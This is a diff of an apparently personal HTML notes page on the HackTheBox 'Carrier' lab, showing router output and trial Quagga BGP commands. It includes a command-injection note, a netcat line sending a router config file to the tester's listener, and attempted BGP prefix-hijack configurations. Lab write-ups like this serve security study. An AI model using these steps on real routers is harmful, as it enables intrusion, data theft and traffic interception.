@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-03-19T13:03:55 EDT">
+<meta name="revised" content="2019-03-19T14:15:36 EDT">
 <title>Carrier :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -149,9 +149,9 @@
         <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
+<li data-nav-id="/hackthebox/boxes/carrierroot/" class="dd-item">
     <div>
-        <a href="/hackthebox/boxes/carrier-root/">
+        <a href="/hackthebox/boxes/carrierroot/">
             Carrier
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
@@ -457,7 +457,7 @@
     <option value="/hackthebox/boxes/blue/" >
   -- 
    Blue</option>
-      <option value="/hackthebox/boxes/carrier-root/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrierroot/" >-- Carrier</option>
       <option value="/hackthebox/boxes/carrier/"  selected>-- Carrier</option>
     <option value="/hackthebox/boxes/crimestoppers/" >
   -- 
@@ -629,14 +629,15 @@ PORT      STATE         SERVICE       VERSION
 
 <h1 id="tickets">Tickets</h1>
 
-<p>1   Closed  Welcome to Lyghtspeed&rsquo;s lightweight telco support system!
-2   Closed  Rx / Mr. White. Says he can&rsquo;t get to &ldquo;the interwebz&rdquo;. Cleared cache/cookie, etc., rebooted PC. Pb fixed.
-3   Open    Rx / Jeremy Paxton. Customer complaining about &ldquo;choke&rdquo; and &ldquo;lags&rdquo; with BoogleGrounds gaming application. Ticket opened with field services to check DSL line. Update 2018/05/30: DSL line checks out OK, sending to IP Core team for further investigation.
+<pre><code>1   Closed  Welcome to Lyghtspeed's lightweight telco support system!
+2   Closed  Rx / Mr. White. Says he can't get to &quot;the interwebz&quot;. Cleared cache/cookie, etc., rebooted PC. Pb fixed.
+3   Open    Rx / Jeremy Paxton. Customer complaining about &quot;choke&quot; and &quot;lags&quot; with BoogleGrounds gaming application. Ticket opened with field services to check DSL line. Update 2018/05/30: DSL line checks out OK, sending to IP Core team for further investigation.
 4   Escalated   Rx / Cust #642. Need help setting up Outlook Express on Windows 98. Told customer this platform is no longer supported. Customer has requested an escalation to my manager.
-5   Closed  Rx / LoneWolf7653. User called in to report what is according to him a &ldquo;critical security issue&rdquo; in our demarc equipment. Mentioned something about a CVE (??). Request contact info and sent to legal for further action.
-6   Closed  Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.<sup>17</sup>&frasl;<sub>24</sub>&rsquo;s, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating&hellip; Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.
-7   Closed  Rx / Pam Dubois. Customer is inquiring about multiple emails received from a &ldquo;Nigerian Prince&rdquo;. Upselled customer our email security mgmt solution.
-8   Open    Rx / Roger (from CastCom): wants to schedule a test of their route filtering policy, asked us to inject one of their routes from our side. He&rsquo;s insisted we tag the route correctly so it is not readvertised to other BGP AS&rsquo;es.</p>
+5   Closed  Rx / LoneWolf7653. User called in to report what is according to him a &quot;critical security issue&quot; in our demarc equipment. Mentioned something about a CVE (??). Request contact info and sent to legal for further action.
+6   Closed  Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17/24's, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating... Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.
+7   Closed  Rx / Pam Dubois. Customer is inquiring about multiple emails received from a &quot;Nigerian Prince&quot;. Upselled customer our email security mgmt solution.
+8   Open    Rx / Roger (from CastCom): wants to schedule a test of their route filtering policy, asked us to inject one of their routes from our side. He's insisted we tag the route correctly so it is not readvertised to other BGP AS'es. 
+</code></pre>
 
 <p><img src="https://chickenpwny.github.io/images/carrier/www-dashboard.PNG" alt="www-dashboard" /></p>
 
@@ -654,7 +655,9 @@ PORT      STATE         SERVICE       VERSION
 
 <p><img src="https://chickenpwny.github.io/images/carrier/www-dashboard-6.PNG" alt="www-dashboard-6" /></p>
 
-<h3 id="user-txt">USER.TXT</h3>
+<h3 id="root-txt">root.TXT</h3>
+
+<p>This is where the madness begins. I&rsquo;m keeping this craziness for my notes so it wont make much since. Please read CarrierRoot.</p>
 
 <p>After fuzzing the website for awhile the only thing that seems exploitable was check function/action. After awhile of trial and error I figured out that it needs the initial part then using &amp;&amp; after it will execute the commands</p>
 
@@ -692,27 +695,31 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 
 <p>There are some distinct differences between the openbsd netcat and ubuntu</p>
 
-<p>nc -w 3 10.10.14.14 9058 &lt; zebra.conf</p>
+<pre><code> nc -w 3 10.10.14.14 9058 &lt; zebra.conf
 
-<p>nc -lp  &gt; zebra.conf</p>
+nc -lp  &gt; zebra.conf
 
-<p>show version
+
+
+show version
 Quagga 0.99.24.1 (Router).
 Copyright 1996-2005 Kunihiro Ishiguro, et al.
-configured with:</p>
+configured with:
 
-<p>show logging
+show logging
 Syslog logging: disabled
 Stdout logging: disabled
 Monitor logging: level debugging
 File logging: disabled
 Protocol name: ZEBRA
 Record priority: disabled
-Timestamp precision: 0</p>
+Timestamp precision: 0
 
-<h6 id="cat-etc-quagga-bgpd-conf">cat /etc/quagga/bgpd.conf</h6>
 
-<p>!
+
+###### cat /etc/quagga/bgpd.conf
+
+!
 ! Zebra configuration saved from vty
 !   2018/07/02 02:14:27
 !
@@ -730,7 +737,8 @@ router bgp 100
  neighbor 10.78.11.2 route-map to-as300 out
 !
 line vty
-!</p>
+!
+</code></pre>
 
 <h1 id="sudo-ip-route">sudo ip route</h1>
 
@@ -754,89 +762,96 @@ telnet localhost 2601 -l zebra
 
 <h2 id="netstat-rn">netstat -rn</h2>
 
-<p>Kernel IP routing table
+<pre><code>Kernel IP routing table
 Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
-0.0.0.0         10.99.64.1      0.0.0.0         UG        0 0          0 eth0</p>
+0.0.0.0         10.99.64.1      0.0.0.0         UG        0 0          0 eth0
+</code></pre>
 
 <h2 id="sudo-vtysh-c-show-ip-route">sudo vtysh -c &ldquo;show ip route&rdquo;</h2>
 
-<p>sudo: unable to resolve host r1: Connection refused
+<pre><code>sudo: unable to resolve host r1: Connection refused
 Codes: K - kernel route, C - connected, S - static, R - RIP,
 ​       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel,
-​       &gt; - selected route, * - FIB route</p>
+​       &gt; - selected route, * - FIB route
 
-<p>K&gt;* 0.0.0.0/0 via 10.99.64.1, eth0
+K&gt;* 0.0.0.0/0 via 10.99.64.1, eth0
 C&gt;* 10.78.10.0/24 is directly connected, eth1
 C&gt;* 10.78.11.0/24 is directly connected, eth2
 C&gt;* 10.99.64.0/24 is directly connected, eth0
-C&gt;* 127.0.0.0/8 is directly connected, lo</p>
+C&gt;* 127.0.0.0/8 is directly connected, lo
+</code></pre>
 
-<h1 id="sudo-vtysh-c-show-ip-bgp">sudo vtysh -c &ldquo;show ip bgp&rdquo;</h1>
+<h2 id="sudo-vtysh-c-show-ip-bgp">sudo vtysh -c &ldquo;show ip bgp&rdquo;</h2>
 
-<p>sudo: unable to resolve host r1: Connection refused
+<pre><code>sudo: unable to resolve host r1: Connection refused
 BGP table version is 0, local router ID is 10.255.255.1
 Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,
 ​              i internal, r RIB-failure, S Stale, R Removed
-Origin codes: i - IGP, e - EGP, ? - incomplete</p>
+Origin codes: i - IGP, e - EGP, ? - incomplete
 
-<p>Network          Next Hop            Metric LocPrf Weight Path
+   Network          Next Hop            Metric LocPrf Weight Path
 *&gt; 10.78.10.0/24    0.0.0.0                  0         32768 ?
 *&gt; 10.78.11.0/24    0.0.0.0                  0         32768 ?
 *&gt; 10.99.64.0/24    0.0.0.0                  0         32768 ?
 *&gt; 10.101.8.0/21    0.0.0.0                  0         32768 i
-*&gt; 10.101.16.0/21   0.0.0.0                  0         32768 i</p>
+*&gt; 10.101.16.0/21   0.0.0.0                  0         32768 i
+</code></pre>
 
 <p>to view route tables inside quagga</p>
 
 <p><a href="https://www.nongnu.org/quagga/docs/docs-multi/Static-Route-Commands.html">https://www.nongnu.org/quagga/docs/docs-multi/Static-Route-Commands.html</a></p>
 
-<h1 id="show-ip-route">show ip route</h1>
+<h3 id="show-ip-route">show ip route</h3>
 
-<p>Codes: K - kernel route, C - connected, S - static, R - RIP,
+<pre><code>Codes: K - kernel route, C - connected, S - static, R - RIP,
 ​       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel,
-​       &gt; - selected route, * - FIB route</p>
+​       &gt; - selected route, * - FIB route
 
-<p>K&gt;* 0.0.0.0/0 via 10.99.64.1, eth0
+K&gt;* 0.0.0.0/0 via 10.99.64.1, eth0
 C&gt;* 10.78.10.0/24 is directly connected, eth1
 C&gt;* 10.78.11.0/24 is directly connected, eth2
 C&gt;* 10.99.64.0/24 is directly connected, eth0
-B&gt;* 10.100.10.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.11.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.12.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.13.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.14.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.15.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.16.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.17.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.18.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.19.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.100.20.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
-B&gt;* 10.120.10.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.11.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.12.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.13.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.14.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.15.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.16.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.17.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.18.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.19.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-B&gt;* 10.120.20.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
-C&gt;* 127.0.0.0/8 is directly connected, lo</p>
+B&gt;* 10.100.10.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.11.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.12.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.13.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.14.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.15.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.16.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.17.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.18.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.19.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.20.0/24 [20/0] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.120.10.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.11.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.12.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.13.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.14.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.15.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.16.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.17.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.18.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.19.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.20.0/24 [20/0] via 10.78.11.2, eth2, 00:06:16
+C&gt;* 127.0.0.0/8 is directly connected, lo
+</code></pre>
 
-<h1 id="router-show-ip-route-10-120-15-0-24">Router# show ip route 10.120.15.0/24</h1>
+<h3 id="router-show-ip-route-10-120-15-0-24">Router# show ip route 10.120.15.0/24</h3>
 
-<p>show ip route 10.120.15.0/24
+<ul>
+<li><p>```
+show ip route 10.120.15.0/24
 Routing entry for 10.120.15.0/24
   Known via &ldquo;bgp&rdquo;, distance 20, metric 0, best
   Last update 00:08:16 ago</p>
 
 <ul>
-<li><p>10.78.11.2, via eth2</p></li>
+<li>10.78.11.2, via eth2</li>
+<li>
+```</li>
+</ul>
 
-<li></li>
-
-<li><h1 id="router-show-running-config">Router# show running-config</h1>
+<h3 id="router-show-running-config">Router# show running-config</h3>
 
 <pre><code>show running-config
     
@@ -858,25 +873,24 @@ router bgp 100
 !
 route-map to-as200 permit 10
 !
-route-map to-as300 permit 10
+route-map to-as300 ermit 10
 !
 line vty
-</code></pre>
-
-<p>!</p></li>
+</code></pre></li>
 </ul>
 
-<h1 id="arp">arp</h1>
+<h4 id="arp">arp</h4>
 
-<p>Address                  HWtype  HWaddress           Flags Mask            Iface
+<pre><code>Address                  HWtype  HWaddress           Flags Mask            Iface
 10.99.64.251             ether   00:16:3e:f3:92:14   C                     eth0
 10.78.10.2               ether   00:16:3e:5b:49:a9   C                     eth1
 10.78.11.2               ether   00:16:3e:c4:fa:83   C                     eth2
-10.99.64.1               ether   fe:30:d6:a4:df:a0   C                     eth0</p>
+10.99.64.1               ether   fe:30:d6:a4:df:a0   C                     eth0
 
-<p>sweet the addresses needed or are theses the address I set. i believe i only need to change the route metric of one of the addresses.</p>
+sweet the addresses needed or are theses the address I set. i believe i only need to change the route metric of one of the addresses. 
 
-<p>BGP COMMANDS</p>
+BGP COMMANDS
+</code></pre>
 
 <h3 id="summary-of-tickets">summary of tickets</h3>
 
@@ -1029,19 +1043,20 @@ sudo iptables -t nat -A POSTROUTING -s 10.120.15.1 -j NETMAP --to 10.78.11.2
 
 <p>tracepath is for linxu traceroute is for windows duh</p>
 
-<h1 id="tracepath-10-120-15-10">tracepath 10.120.15.10</h1>
+<h3 id="tracepath-10-120-15-10">tracepath 10.120.15.10</h3>
 
 <p>why does the local ip repeat? &ldquo;symptom of suboptimal route or load-sharing&rdquo; troubleshooting next-hop table particular route-map/PBR/filters applied to the ip. show cdp neighbor.</p>
 
-<p>1?: [LOCALHOST]                                         pmtu 1500
- 1:  10.78.11.2                                            0.053ms
- 1:  10.78.11.2                                            0.021ms
+<pre><code> 1?: [LOCALHOST]                                         pmtu 1500
+ 1:  10.78.11.2                                            0.053ms 
+ 1:  10.78.11.2                                            0.021ms 
  2:  10.120.15.10                                          0.055ms reached
-  Resume: pmtu 1500 hops 2 back 2</p>
+  Resume: pmtu 1500 hops 2 back 2 
 
-<p>ftp 10.120.15.10</p>
+ ftp 10.120.15.10
 
-<p>Login failed.</p>
+Login failed.
+</code></pre>
 
 <p>TRYING TO UNDERSTAND BGP NEIGHBORS</p>
 
@@ -1143,41 +1158,9 @@ trying to change the route-map
 
 <p>bgpp prefix hijacking is where you take control of a prefix or 10.<sup>1</sup>&frasl;<sub>8</sub></p>
 
-<p>as 100 10.78.0.0/16</p>
-
-<p>as 200 10.100.0.0/16</p>
-
-<p>as 300 10.120.0.0/16</p>
-
 <p><img src="https://chickenpwny.github.io/images/carrier/maps.png" alt="maps" /></p>
 
-<p>eliminating bgpd sub prefix hijacking</p>
-
-<p>try one</p>
-
-<p>router bgp 100</p>
-
-<p>no network 10.78.10.0/24</p>
-
-<p>network 10.78.11.0/24</p>
-
-<p>try two</p>
-
-<p>router bgp 100</p>
-
-<p>no network 10.78.10.1</p>
-
-<p>network 10.78.11.1</p>
-
-<p>try three</p>
-
-<p>router bgp 100</p>
-
-<p>no network 10.78.10.<sup>1</sup>&frasl;<sub>24</sub></p>
-
-<p>network 10.78.11.0/24</p>
-
-<h1 id="fail-4">fail 4</h1>
+<h3 id="fail-4">fail 4</h3>
 
 <pre><code>neighbor 10.120.15.10 remote-as 100
 
@@ -1187,74 +1170,6 @@ neighbor 10.120.15.10 update-source eth1
 
 neighbor 10.120.15.10 update-source loopback
 </code></pre>
-
-<p>neighbor 10.120.15.1 remote-as 100</p>
-
-<p>neighbor 10.120.15.1 remote-as 100</p>
-
-<p>neighbor 10.120.15.1 remote-as 100</p>
-
-<p>network 10.120.0.0</p>
-
-<p>neighbor 10.120.15.1 remote-as 100</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>fail</p>
-
-<p>neighbor 10.120.1.1 remote-as 300</p>
-
-<p>neighbor 10.100.1.1 remote-as 100</p>
-
-<p>neighbor 10.100.1.1 update-source loopback</p>
-
-<p>neighbor 10.100.10.1 remote-as 200</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>network 10.0.0.0</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>neighbor 10.100.10.1 remote-as 200</p>
-
-<p>network 10.120.0.0</p>
-
-<p>neighbor 10.120.15.10 remote-as 300</p>
-
-<p>neighbor 10.120.15.10 distribute-list 1 out</p>
-
-<p>access-list 1 deny 10.120.15.0 255.255.255.0</p>
-
-<p>access-list 1 permit  0.0.0.0 255.255.255.255</p>
-
-<p>neighbor 10.120.15.1 remote-as 300q</p>
-
-<p>neighbor 10.100.0.0 remote-as 200</p>
-
-<p>network 10.120.0.0</p>
-
-<p>neighbor 10.100.10.1 remote-as 200</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>network 10.120.0.0</p>
-
-<p>neighbor 10.100.10.1 remote-as 200</p>
-
-<p>neighbor 10.100.10.1 filter-list 5 weight 100</p>
-
-<p>neighbor 10.100.10.1 filter-list 5 weight 200</p>
-
-<p>neighbor 10.100.10.1 route-map setweightin in</p>
-
-<p>neighbor 10.120.15.1 remote-as 200</p>
-
-<p>neighbor 10.120.15.1 route-map setweightin in</p>
-
-<p>So, recap a vip is trying to ftp to 10.120.15.10 which is 10.120.0.<sup>1</sup>&frasl;<sub>16</sub> as 300</p>
-
-<p>obviously im just poking hole until i get a result. lets just list all the bgp commands and ways that might be relivant.</p>
 
 <h1 id="overview-of-bgp-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-howbgpwork"><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork">OVERVIEW OF BGP</a></h1>
 
@@ -2124,46 +2039,12 @@ wr
 cp bgpd.conf.orig bgpd.conf
 </code></pre>
 
-<p>neighbor 10.78.10.2 route-map to-as200 in</p>
-
-<p>neighbor 10.78.11.2 route-map to-as300 in</p>
-
-<p>route-map to-as200 permit 20</p>
-
-<p>match</p>
-
-<p>route-map to-as300 permit 10
-match as-path 1
-set weight 1</p>
-
-<p>example 2</p>
-
-<p>ip as-path access-list 1 permit ^200$</p>
-
-<p>ip as-path access-list 2 permit ^300$</p>
-
-<p>network 10.120.0.0</p>
-
-<p>neighbor 10.120.15.1 remote-as 300</p>
-
-<p>neighbor 10.120.15.1 route-map to-as300 out</p>
-
-<p>match ip address</p>
-
-<p>access-list 1 deny 10.120.0.0 0.0.255.255</p>
-
-<p>access-list 1 permit 0.0.0.0 255.255.255.255</p>
-
-<p>route-map to-ass300 permit 20</p>
-
-<p>network 10.120.15.0</p>
-
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/hackthebox/boxes/carrier-root/" title="Carrier"> <i class="fa fa-chevron-left"></i><label>Carrier</label></a>
+<a class="nav nav-prev" href="/hackthebox/boxes/carrierroot/" title="Carrier"> <i class="fa fa-chevron-left"></i><label>Carrier</label></a>
     <a class="nav nav-next" href="/hackthebox/boxes/crimestoppers/" title="CrimeStopper" style="margin-right: 0px;"><label>CrimeStopper</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
